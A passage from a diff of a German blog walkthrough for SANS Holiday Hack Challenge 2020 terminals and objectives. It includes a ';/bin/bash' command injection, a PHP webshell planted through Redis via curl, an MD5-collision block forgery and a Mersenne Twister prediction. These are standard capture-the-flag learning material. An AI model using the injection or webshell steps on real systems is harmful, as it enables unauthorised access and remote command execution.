-<p>Wer kein <code class="language-plaintext highlighter-rouge">xclip</code> verwenden kann, kann <code class="language-plaintext highlighter-rouge">| xclip -sel clip</code> entfernen und das copy-paste manuell durchführen.</p>
+Wer kein `xclip` verwenden kann, kann `| xclip -sel clip` entfernen und das copy-paste manuell durchführen.
 
 <pre><code class="bash">var=$(python3 naughty_nice.py);(echo -n "["; for i in $(tail -n +2 &lt;(echo ${var##*Nonces==})); do echo -n "$i"",";done; echo -n "]") | xclip -sel clip
 (-&gt; copied var into array of analyze_nonces.py)
@@ -1295,18 +1111,16 @@ python3 analyze_nonces.py | tail -n 1|awk '{print $2}'
 echo 'obase=16;;6270808489970332317'|bc
 </code></pre>
 
-<p>Lösung:</p>
+Lösung:
 
-<p><strong>57066318F32F729D</strong></p>
+**57066318F32F729D**
 
-<h2 id="11b---naughty--nice-list-with-blockchain-part-2">
-<a class="anchor" href="#11b---naughty--nice-list-with-blockchain-part-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>11b - Naughty / Nice List with Blockchain Part 2</h2>
+## 11b - Naughty / Nice List with Blockchain Part 2
 
-<h3 id="mögliche-lösung-11">
-<a class="anchor" href="#m%C3%B6gliche-l%C3%B6sung-11" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mögliche Lösung</h3>
+### Mögliche Lösung
 
-<p>Füge nach der Funktion <code class="language-plaintext highlighter-rouge">full_hash</code> eine Funktion<code class="language-plaintext highlighter-rouge"> full_hash_SHA256</code> wie folgt hinzu, sodass 
-du die SHA256-Hashes der Blöcke berechnen kannst:</p>
+Füge nach der Funktion `full_hash` eine Funktion` full_hash_SHA256` wie folgt hinzu, sodass 
+du die SHA256-Hashes der Blöcke berechnen kannst:
 
 <pre><code class="python">...
 
@@ -1326,7 +1140,7 @@ du die SHA256-Hashes der Blöcke berechnen kannst:</p>
 ...
 </code></pre>
 
-<p>und gebe sie aus:</p>
+und gebe sie aus:
 
 <pre><code class="python">if __name__ == '__main__':
     with open('official_public.pem', 'rb') as fh:
@@ -1336,17 +1150,17 @@ du die SHA256-Hashes der Blöcke berechnen kannst:</p>
         print(block.index, block.full_hash_SHA256())
 </code></pre>
 
-<p>Dann identifiziere den Block mittels:</p>
+Dann identifiziere den Block mittels:
 
 <pre><code class="bash">python3 naughty_nice.py|grep '58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f'
 129459 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f
 </code></pre>
 
-<p>Speichere diesen Block in <code class="language-plaintext highlighter-rouge">tohash</code>. Kopiere <code class="language-plaintext highlighter-rouge">tohash</code> in <code class="language-plaintext highlighter-rouge">tohash.old</code>:</p>
+Speichere diesen Block in `tohash`. Kopiere `tohash` in `tohash.old`:
 
 <pre><code class="bash">cp tohash tohash.old</code></pre>
 
-<p>Extrahiere alle Dokumente des Blocks - verändere <code class="language-plaintext highlighter-rouge">naughty_nice.py</code> zu:</p>
+Extrahiere alle Dokumente des Blocks - verändere `naughty_nice.py` zu:
 
 <pre><code class="python">
      ...
@@ -1358,69 +1172,61 @@ du die SHA256-Hashes der Blöcke berechnen kannst:</p>
 
 </code></pre>
 
-<p>und führe es aus</p>
+und führe es aus 
 
 <pre><code class="bash">python3 naughty_nice.py</code></pre>
 
-<p>Um den gleichen Hash zu erzeugen suchen wir Paare die jeweils um +1 -1 verändert wurden.</p>
+Um den gleichen Hash zu erzeugen suchen wir Paare die jeweils um +1 -1 verändert wurden.
 
-<p>Das erste Byte ist im PDF. Jack Frost hat ein anderes Objekt referenziert sodass ein anderer Text angezeigt wird.</p>
+Das erste Byte ist im PDF. Jack Frost hat ein anderes Objekt referenziert sodass ein anderer Text angezeigt wird.
 
-<p>Anhand des Original-Textes kannst du identifizieren, dass er auch das Vorzeichen der Naughtyness/Niceness-Score für diesen
-Block verändert hat.</p>
+Anhand des Original-Textes kannst du identifizieren, dass er auch das Vorzeichen der Naughtyness/Niceness-Score für diesen
+Block verändert hat.
 
-<p>Nach dem empfohlenen Talk wissen wir, dass 64 Bytes nach der jeweiligen Änderung der Gegenpart sich zu befinden hat.</p>
+Nach dem empfohlenen Talk wissen wir, dass 64 Bytes nach der jeweiligen Änderung der Gegenpart sich zu befinden hat.
 
-<p>Ändere die Bytes in <code class="language-plaintext highlighter-rouge">tohash</code> entsprechend und überprüfe mit</p>
+Ändere die Bytes in `tohash` entsprechend und überprüfe mit 
 
-<p><code class="language-plaintext highlighter-rouge">md5sum tohash</code></p>
+`md5sum tohash`
 
-<p>ob es den gleichen Hash <code class="language-plaintext highlighter-rouge">b10b4a6bd373b61f32f4fd3a0cdfbf84</code> hat.</p>
+ob es den gleichen Hash `b10b4a6bd373b61f32f4fd3a0cdfbf84` hat.
 
 <pre><code class="bash">vbindiff tohash tohash.old</code></pre>
 
-<p><img src="/blog/assets/img/hhc/2020/obj_11b_step_1.png" width="100%" alt="Step 1 objective 11b"></p>
+<img src="/blog/assets/img/hhc/2020/obj_11b_step_1.png" width="100%" alt="Step 1 objective 11b">
 
-<p>Wenn ja berechne den neuen SHA256-Hash hiervon.</p>
+Wenn ja berechne den neuen SHA256-Hash hiervon.
 
-<h2 id="ende-des-spiels">
-<a class="anchor" href="#ende-des-spiels" aria-hidden="true"><span class="octicon octicon-link"></span></a>Ende des Spiels</h2>
+## Ende des Spiels
 
-<p>Gehe zurück durch das Bild und dann umgehe den Fingerabdruck-Sensor um in Santa’s Büro zu kommen.
-Dort gehe in das hintere Zimmer.</p>
+Gehe zurück durch das Bild und dann umgehe den Fingerabdruck-Sensor um in Santa's Büro zu kommen.
+Dort gehe in das hintere Zimmer.
 
-<h1 id="terminal-challenges">
-<a class="anchor" href="#terminal-challenges" aria-hidden="true"><span class="octicon octicon-link"></span></a>Terminal Challenges</h1>
+# Terminal Challenges
 
-<h2 id="entry">
-<a class="anchor" href="#entry" aria-hidden="true"><span class="octicon octicon-link"></span></a>Entry</h2>
+## Entry
 
-<h3 id="unescape-tmux">
-<a class="anchor" href="#unescape-tmux" aria-hidden="true"><span class="octicon octicon-link"></span></a>Unescape tmux</h3>
+### Unescape tmux
 
 <pre><code class="bash">tmux attach
 </code></pre>
 
-<h3 id="kringle-kiosk">
-<a class="anchor" href="#kringle-kiosk" aria-hidden="true"><span class="octicon octicon-link"></span></a>Kringle Kiosk</h3>
+### Kringle Kiosk
 
-<p>Enter 4 and then <code class="language-plaintext highlighter-rouge">;/bin/bash</code></p>
+Enter 4 and then `;/bin/bash`
 
-<h2 id="dining-room">
-<a class="anchor" href="#dining-room" aria-hidden="true"><span class="octicon octicon-link"></span></a>Dining Room</h2>
+## Dining Room
 
-<h3 id="elf-coder">
-<a class="anchor" href="#elf-coder" aria-hidden="true"><span class="octicon octicon-link"></span></a>Elf Coder</h3>
+### Elf Coder
 
-<h4 id="level-0">
-<a class="anchor" href="#level-0" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 0</h4>
+
+#### Level 0
 
 <pre><code class="javascript">elf.moveTo(lollipop[0])
 elf.moveUp(10)
 </code></pre>
 
-<h4 id="level-1">
-<a class="anchor" href="#level-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h4>
+#### Level 1
 
 <pre><code class="javascript">elf.moveTo(lever[0])
 elf.pull_lever(elf.get_lever(0) + 2)
@@ -1428,8 +1234,7 @@ elf.moveLeft(4)
 elf.moveUp(10)
 </code></pre>
 
-<h4 id="level-2">
-<a class="anchor" href="#level-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h4>
+#### Level 2
 
 <pre><code class="javascript">lollipop.forEach(function(item) {
     elf.moveTo(item)
@@ -1437,8 +1242,7 @@ elf.moveUp(10)
 elf.moveUp(1)
 </code></pre>
 
-<h4 id="level-3">
-<a class="anchor" href="#level-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h4>
+#### Level 3
 
 <pre><code class="javascript">for (rounds =1; rounds &lt;= 5; rounds++) {
     elf.moveLeft(3);
@@ -1447,8 +1251,7 @@ elf.moveUp(1)
 }
 </code></pre>
 
-<h4 id="level-4">
-<a class="anchor" href="#level-4" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h4>
+#### Level 4
 
 <pre><code class="javascript">let numbersOnly = (val) =&gt; {
     if (typeof(val) == 'number') {
@@ -1460,8 +1263,7 @@ elf.moveTo(lollipop[1])
 elf.moveTo(lollipop[0])
 </code></pre>
 
-<h4 id="level-5">
-<a class="anchor" href="#level-5" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h4>
+#### Level 5
 
 <pre><code class="javascript">let numbersOnly = (val) =&gt; {
   if (typeof(val) == 'number') {
@@ -1475,8 +1277,7 @@ elf.tell_munch(numbers)
 elf.moveUp(2)
 </code></pre>
 
-<h4 id="level-6">
-<a class="anchor" href="#level-6" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h4>
+#### Level 6
 
 <pre><code class="javascript">for (rounds = 0; rounds &lt;= 3; rounds++) {
   elf.moveTo(lollipop[rounds])
@@ -1489,8 +1290,7 @@ elf.moveTo(munchkin[0])
 elf.moveUp(2)
 </code></pre>
 
-<h4 id="level-7">
-<a class="anchor" href="#level-7" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 7</h4>
+#### Level 7
 
 <pre><code class="javascript">function fun(arr) {
   let amount = 0;
@@ -1517,8 +1317,7 @@ elf.tell_munch(fun)
 elf.moveUp(2);
 </code></pre>
 
-<h4 id="level-8">
-<a class="anchor" href="#level-8" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 8</h4>
+#### Level 8
 
 <pre><code class="javascript">function getLolKeyFromJson(jsonData) {
   returnValue = ""
@@ -1545,42 +1344,39 @@ elf.tell_munch(getLolKeyFromJson)
 elf.moveRight(11)
 </code></pre>
 
-<h2 id="kitchen">
-<a class="anchor" href="#kitchen" aria-hidden="true"><span class="octicon octicon-link"></span></a>Kitchen</h2>
+## Kitchen
 
-<h3 id="336-kbps">
-<a class="anchor" href="#336-kbps" aria-hidden="true"><span class="octicon octicon-link"></span></a>33.6 Kbps</h3>
+### 33.6 Kbps
 
-<p>Mit Trial-and-Error:</p>
+Mit Trial-and-Error:
 
-<p>Nu = Numbers</p>
+Nu = Numbers
 
-<p>be = baaDeebrr</p>
+be = baaDeebrr
 
-<p>WE = WEwwee</p>
+WE = WEwwee
 
-<p>SC = SCHHRR</p>
+SC = SCHHRR
 
-<p>aa = aaah</p>
+aa = aaah
 
-<p>ba = baaDEERR</p>
+ba = baaDEERR
 
-<p>x Nu-ba-WE-SC -&gt; Hang up at WE</p>
+x Nu-ba-WE-SC -&gt; Hang up at WE
 
-<p>x Nu-aa-ba-WE-SC -&gt; Hang up at aa</p>
+x Nu-aa-ba-WE-SC -&gt; Hang up at aa
 
-<p>x Nu-ba-aa-WE-SC -&gt; Hang up at SC</p>
+x Nu-ba-aa-WE-SC -&gt; Hang up at SC
 
-<p>Am Ende hat</p>
+Am Ende hat 
 
-<p><strong>Nu-ba-aa-WE-be-SC</strong></p>
+**Nu-ba-aa-WE-be-SC**
 
-<p>funktioniert</p>
+funktioniert
 
-<h3 id="redis-investigation">
-<a class="anchor" href="#redis-investigation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Redis Investigation</h3>
+### Redis Investigation
 
-<p>Nutzend</p>
+Nutzend
 
 <pre><code class="bash">alias urlencode
 urlencode=$'python3 -c "import sys, urllib.parse as ul; \\\n    print (ul.quote_plus(sys.argv[1]))"'
@@ -1595,20 +1391,15 @@ curl http://localhost/maintenance.php?cmd=set,test,%22%3C%3Fphp+system%28%24_GET
 curl http://localhost/maintenance.php?cmd=save
 </code></pre>
 
-<p><img src="/blog/assets/img/hhc/2020/tc_redis_solution.png" width="100%" alt="solution terminal challenge redis"></p>
+<img src="/blog/assets/img/hhc/2020/tc_redis_solution.png" width="100%" alt="solution terminal challenge redis">
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/499403897" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/499403897" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></div>
 <script src="https://player.vimeo.com/api/player.js"></script>
-
 <p>Videobeschreibung unter <a href="https://player.vimeo.com/video/499403897" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/499403897</a></p>
 
-<h2 id="courtyard">
-<a class="anchor" href="#courtyard" aria-hidden="true"><span class="octicon octicon-link"></span></a>Courtyard</h2>
+## Courtyard
 
-<h3 id="linux-primer">
-<a class="anchor" href="#linux-primer" aria-hidden="true"><span class="octicon octicon-link"></span></a>Linux Primer</h3>
+### Linux Primer
 
 <pre><code class="bash">yes
 ls
@@ -1637,76 +1428,58 @@ curl 127.0.0.1:54321
 kill 6086
 </code></pre>
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/499139051" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/499139051" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></div>
 <script src="https://player.vimeo.com/api/player.js"></script>
-
 <p>Videobeschreibung unter <a href="https://player.vimeo.com/video/499139051" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/499139051</a></p>
 
-<h2 id="workshop">
-<a class="anchor" href="#workshop" aria-hidden="true"><span class="octicon octicon-link"></span></a>Workshop</h2>
+## Workshop
 
-<h3 id="sort-o-matic-regex-game">
-<a class="anchor" href="#sort-o-matic-regex-game" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sort-o-matic Regex Game</h3>
+### Sort-o-matic Regex Game
 
-<p>Zum Lösen dieser Aufgabe gehe auf <a href="https://regex101.com/" target="_blank" rel="noopener noreferrer">https://regex101.com/</a>.
+Zum Lösen dieser Aufgabe gehe auf <a href="https://regex101.com/" target="_blank" rel="noopener noreferrer">https://regex101.com/</a>.
 Dort stehen auch nützliche Tipps für die Syntax.
 Gebe für jeden Fall Testdaten ein. Du kannst mit einem einfachen beginnen und
-dich dann so der letztendlichen Regex nähern.</p>
+dich dann so der letztendlichen Regex nähern.
 
-<p>Beispiel letzter Fall:</p>
+Beispiel letzter Fall:
 
-<blockquote>
-  <p>Matches multiple day, month, and year date formats only</p>
-</blockquote>
+&gt;Matches multiple day, month, and year date formats only
 
-<p>Stimmt nur überein mit mehreren Tag, Monat, und Jahr-Formaten</p>
+Stimmt nur überein mit mehreren Tag, Monat, und Jahr-Formaten 
 
-<p>Dann habe ich angefangen mit dem Testfall</p>
+Dann habe ich angefangen mit dem Testfall
 
-<p><code class="language-plaintext highlighter-rouge">10/10/1978</code> und der Regex <code class="language-plaintext highlighter-rouge">10\/10\/1978</code>.
+`10/10/1978` und der Regex `10\/10\/1978`.
 Dann überlegt wo können welche Zahlen stehen etwa ein Tag kann etwa mit 
-<code class="language-plaintext highlighter-rouge">0</code> oder <code class="language-plaintext highlighter-rouge">1</code> beginnen also:
-<code class="language-plaintext highlighter-rouge">(0|1)0\/10\/1978</code> usw.</p>
+`0` oder `1` beginnen also:
+`(0|1)0\/10\/1978` usw.
 
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">\d</code></li>
-  <li><code class="language-plaintext highlighter-rouge">[a-zA-Z][a-zA-Z][a-zA-Z]</code></li>
-  <li><code class="language-plaintext highlighter-rouge">[a-z0-9][a-z0-9]</code></li>
-  <li><code class="language-plaintext highlighter-rouge">[^A-L1-5][^A-L1-5]</code></li>
-  <li><code class="language-plaintext highlighter-rouge">^\d{3,}$</code></li>
-  <li><code class="language-plaintext highlighter-rouge">^([01]?\d|2[0-3]):([0-5]\d):([0-5]\d)+$</code></li>
-  <li><code class="language-plaintext highlighter-rouge">^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$</code></li>
-  <li><code class="language-plaintext highlighter-rouge">^((0[0-9]|1[0-9]|2[0-9]|3[0-1])[\/\.\-](0[1-9]|1[0-2])[\/\.\-][0-1][0-9][0-9][0-9])$</code></li>
-</ol>
+1. `\d`
+2. `[a-zA-Z][a-zA-Z][a-zA-Z]`
+3. `[a-z0-9][a-z0-9]`
+4. `[^A-L1-5][^A-L1-5]`
+5. `^\d{3,}$`
+6. `^([01]?\d|2[0-3]):([0-5]\d):([0-5]\d)+$`
+7. `^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$`
+8. `^((0[0-9]|1[0-9]|2[0-9]|3[0-1])[\/\.\-](0[1-9]|1[0-2])[\/\.\-][0-1][0-9][0-9][0-9])$`
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/499540767" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/499540767" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></div>
 <script src="https://player.vimeo.com/api/player.js"></script>
-
 <p>Video description at <a href="https://player.vimeo.com/video/499540767" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/499540767</a></p>
 
-<h2 id="talks-lobby">
-<a class="anchor" href="#talks-lobby" aria-hidden="true"><span class="octicon octicon-link"></span></a>Talks Lobby</h2>
+## Talks Lobby
 
-<h3 id="speaker-unprep">
-<a class="anchor" href="#speaker-unprep" aria-hidden="true"><span class="octicon octicon-link"></span></a>Speaker UNPrep</h3>
+### Speaker UNPrep
 
-<h4 id="door">
-<a class="anchor" href="#door" aria-hidden="true"><span class="octicon octicon-link"></span></a>Door</h4>
+#### Door
 
-<h4 id="lights">
-<a class="anchor" href="#lights" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lights</h4>
+#### Lights
 
-<p>Bushy Evergreen gibt den Tipp</p>
+Bushy Evergreen gibt den Tipp
 
-<blockquote>
-  <p>What if we set the user name to an encrypted value</p>
-</blockquote>
+&gt; What if we set the user name to an encrypted value
 
-<p>und das machen wir!</p>
+und das machen wir!
 
 <pre><code class="bash">cd lab/
 vim lights.conf
@@ -1720,62 +1493,58 @@ cd ..
 (-&gt; Gib das Passwort ein)
 </code></pre>
 
-<p>Lösung:</p>
+Lösung:
 
-<p><strong>Computer-TurnLightsOn</strong></p>
+**Computer-TurnLightsOn**
 
-<h4 id="automat">
-<a class="anchor" href="#automat" aria-hidden="true"><span class="octicon octicon-link"></span></a>Automat</h4>
+#### Automat
 
-<p>Wenn du die Datei <code class="language-plaintext highlighter-rouge">vending-machines.json</code> löschst, so wird beim Starten von <code class="language-plaintext highlighter-rouge">./vending_machines</code>
-eine neue Datei erstellt. Diese Datei enthält dann das neu festgelegte verschlüsselte Passwort.</p>
+Wenn du die Datei `vending-machines.json` löschst, so wird beim Starten von `./vending_machines`
+eine neue Datei erstellt. Diese Datei enthält dann das neu festgelegte verschlüsselte Passwort. 
 
-<p>Das kann für einen Known-Plaintext Angriff genutzt werden.
+Das kann für einen Known-Plaintext Angriff genutzt werden.
 Wir können jetzt nämlich schauen welches verschlüsselte Passwort bei welchem eingegebenen Klartext entsteht.
-Ich habe zunächst damit begonnen <code class="language-plaintext highlighter-rouge">A</code> einzugeben, was ein <code class="language-plaintext highlighter-rouge">X</code> ergibt.
-Dann <code class="language-plaintext highlighter-rouge">AA</code> woraus <code class="language-plaintext highlighter-rouge">Xi</code> folgt, <code class="language-plaintext highlighter-rouge">B</code> mit <code class="language-plaintext highlighter-rouge">D</code> und schließlich <code class="language-plaintext highlighter-rouge">BA</code> was <code class="language-plaintext highlighter-rouge">Di</code> ergibt.
+Ich habe zunächst damit begonnen `A` einzugeben, was ein `X` ergibt.
+Dann `AA` woraus `Xi` folgt, `B` mit `D` und schließlich `BA` was `Di` ergibt.
 Daraus schloss ich das es sich um eine polyalphabetische Verschlüsselung handelt.
 Das heißt bei jeder Position im Passwort sind die Buchstaben anderen Buchstaben zugeordnet.
-Das kannst du nun knacken in dem du jeden Buchstaben durchprobierst und mit dem eigentlichen verschlüsselten Passwort vergleichst.</p>
+Das kannst du nun knacken in dem du jeden Buchstaben durchprobierst und mit dem eigentlichen verschlüsselten Passwort vergleichst.
 
-<h3 id="snowball-fight">
-<a class="anchor" href="#snowball-fight" aria-hidden="true"><span class="octicon octicon-link"></span></a>Snowball Fight</h3>
+### Snowball Fight
 
-<p>Starte Snowball im Spiel und parallel in einem separaten Browserfenster unter 
+Starte Snowball im Spiel und parallel in einem separaten Browserfenster unter 
 <a href="https://snowball2.kringlecastle.com" target="_blank" rel="noopener noreferrer">https://snowball2.kringlecastle.com</a>
-Beginne im Spiel mit einer “Impossible”- und im separaten Browser-Tab mit einer “Easy”-Session.</p>
+Beginne im Spiel mit einer "Impossible"- und im separaten Browser-Tab mit einer "Easy"-Session.
 
-<p>Innerhalb des Source-Codes in der “Impossible”-Session sind Zufallszahlen in Kommentaren ausgegeben.
-Diese verwendest du um die Zufallszahl in dieser Session zu bestimmen, die derzeit nicht angezeigt wird (“Redacted”).
-Dafür stellst du den Zustand des Mersenne Twister vor der Berechnung der Zahl aus den Zahlen her.</p>
+Innerhalb des Source-Codes in der "Impossible"-Session sind Zufallszahlen in Kommentaren ausgegeben.
+Diese verwendest du um die Zufallszahl in dieser Session zu bestimmen, die derzeit nicht angezeigt wird ("Redacted").
+Dafür stellst du den Zustand des Mersenne Twister vor der Berechnung der Zahl aus den Zahlen her.
 
-<p>-&gt; Kopiere die Kommentarblöcke heraus</p>
+-&gt; Kopiere die Kommentarblöcke heraus
 
-<p>-&gt; <code class="language-plaintext highlighter-rouge">./createrandarr.sh</code></p>
+-&gt; `./createrandarr.sh`
 
-<p>-&gt; Setze die Variable foundrands in <code class="language-plaintext highlighter-rouge">mt19937_adapted.py</code> durch Paste 
-   und passe das Array an, sodass es funktioniert</p>
+-&gt; Setze die Variable foundrands in `mt19937_adapted.py` durch Paste 
+   und passe das Array an, sodass es funktioniert
 
-<p>-&gt; <code class="language-plaintext highlighter-rouge">python3 mt19937_adapted.py</code> das gibt die Zufallszahl aus</p>
+-&gt; `python3 mt19937_adapted.py` das gibt die Zufallszahl aus
 
-<p>Verwende nun diese Zufallszahl in der “Easy”-Session so lange bis zu das Spiel gelöst hast.
-Nun kannst du mit diesem Wissen die “Impossible”-Session lösen.</p>
+Verwende nun diese Zufallszahl in der "Easy"-Session so lange bis zu das Spiel gelöst hast.
+Nun kannst du mit diesem Wissen die "Impossible"-Session lösen.
 
 <pre><code class="bash">cat createrandarr.sh
-</code></pre>
-<p>:</p>
+</code></pre>:
 
 <pre><code class="bash">#! /bin/bash
 comments=$(tail -n +2 &lt;(head -n -2 &lt;(xclip -o -sel clip)))
 (echo -n "["; for i in $(echo "$comments"|awk '{print $1}'); do echo -n $i","; done; echo -n "]") | xclip -sel clip
 </code></pre>
 
-<p>Ohne <code class="language-plaintext highlighter-rouge">xclip</code> könnten die Daten über den Umweg einer Datei manuell kopiert und dann von 
-dort zu einem Array zusammengesetzt werden.</p>
+Ohne `xclip` könnten die Daten über den Umweg einer Datei manuell kopiert und dann von 
+dort zu einem Array zusammengesetzt werden.
 
 <pre><code class="bash">cat mt19937_adapted.py
-</code></pre>
-<p>:</p>
+</code></pre>:
 
 <pre><code class="python">#!/usr/bin/env python3
 
@@ -1849,130 +1618,90 @@ print(myprng.extract_number())
 print(myprng.MT[0])
 </code></pre>
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/499011316" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/499011316" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></div>
 <script src="https://player.vimeo.com/api/player.js"></script>
-
 <p>Video description at <a href="https://player.vimeo.com/video/499011316" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/499011316</a></p>
 
-<h2 id="netwars">
-<a class="anchor" href="#netwars" aria-hidden="true"><span class="octicon octicon-link"></span></a>Netwars</h2>
+## Netwars 
 
-<h3 id="scapy-prepper">
-<a class="anchor" href="#scapy-prepper" aria-hidden="true"><span class="octicon octicon-link"></span></a>Scapy Prepper</h3>
+### Scapy Prepper
 
-<h4 id="task-0">
-<a class="anchor" href="#task-0" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 0</h4>
+#### Task 0
 
 <pre><code class="python">yes
 </code></pre>
 
-<h4 id="task-1">
-<a class="anchor" href="#task-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 1</h4>
+#### Task 1
 
-<blockquote>
-  <p>Welcome to the “Present Packet Prepper” interface! The North Pole could use your help prep
+&gt;Welcome to the "Present Packet Prepper" interface! The North Pole could use your help prep
 aring present packets for shipment.
-Start by running the task.submit() function passing in a string argument of ‘start’.
-Type task.help() for help on this question.</p>
-</blockquote>
+Start by running the task.submit() function passing in a string argument of 'start'.
+Type task.help() for help on this question.
 
 <pre><code class="python">task.submit("start")</code></pre>
 
-<h4 id="task-2">
-<a class="anchor" href="#task-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 2</h4>
+#### Task 2
 
-<blockquote>
-  <p>Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.</p>
-</blockquote>
+&gt;Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
 
 <pre><code class="python">task.submit(send)</code></pre>
 
-<h4 id="task-3">
-<a class="anchor" href="#task-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 3</h4>
+#### Task 3
 
-<blockquote>
-  <p>Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.</p>
-</blockquote>
+&gt;Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.
 
 <pre><code class="python">task.submit(sniff)</code></pre>
 
-<h4 id="task-4">
-<a class="anchor" href="#task-4" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 4</h4>
+#### Task 4
 
-<blockquote>
-  <p>Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named “pkt”:</p>
-  <ol>
-    <li>pkt = sr1(IP(dst=”127.0.0.1”)/TCP(dport=20))</li>
-    <li>pkt = sniff(IP(dst=”127.0.0.1”)/TCP(dport=20))</li>
-    <li>pkt = sendp(IP(dst=”127.0.0.1”)/TCP(dport=20))</li>
-  </ol>
-</blockquote>
+&gt;Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
+&gt;1. pkt = sr1(IP(dst="127.0.0.1")/TCP(dport=20))
+&gt;2. pkt = sniff(IP(dst="127.0.0.1")/TCP(dport=20))
+&gt;3. pkt = sendp(IP(dst="127.0.0.1")/TCP(dport=20))
 
 <pre><code class="python">task.submit(1)</code></pre>
 
-<h4 id="task-5">
-<a class="anchor" href="#task-5" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 5</h4>
+#### Task 5
 
-<blockquote>
-  <p>Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.</p>
-</blockquote>
+&gt;Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.
 
 <pre><code class="python">task.submit(rdpcap)</code></pre>
 
-<h4 id="task-6">
-<a class="anchor" href="#task-6" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 6</h4>
+#### Task 6
 
-<blockquote>
-  <p>The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:</p>
-  <ol>
-    <li>UDP_PACKETS.print()</li>
-    <li>UDP_PACKETS.show()</li>
-    <li>UDP_PACKETS.list()</li>
-  </ol>
-</blockquote>
+&gt;The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:
+&gt;1. UDP_PACKETS.print()
+&gt;2. UDP_PACKETS.show()
+&gt;3. UDP_PACKETS.list()
 
 <pre><code class="python">task.submit(2)</code></pre>
 
-<h4 id="task-7">
-<a class="anchor" href="#task-7" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 7</h4>
+#### Task 7
 
-<blockquote>
-  <p>Submit only the first packet found in UDP_PACKETS.</p>
-</blockquote>
+&gt;Submit only the first packet found in UDP_PACKETS.
 
 <pre><code class="python">task.submit(UDP_PACKETS[0])</code></pre>
 
-<h4 id="task-8">
-<a class="anchor" href="#task-8" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 8</h4>
+#### Task 8
 
-<blockquote>
-  <p>Submit only the entire TCP layer of the second packet in TCP_PACKETS.</p>
-</blockquote>
+&gt;Submit only the entire TCP layer of the second packet in TCP_PACKETS.
 
 <pre><code class="python">pkt = TCP_PACKETS[1]
 task.submit(pkt[TCP])
 </code></pre>
 
-<h4 id="task-9">
-<a class="anchor" href="#task-9" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 9</h4>
+#### Task 9
 
-<blockquote>
-  <p>Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet</p>
-</blockquote>
+&gt;Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet
 
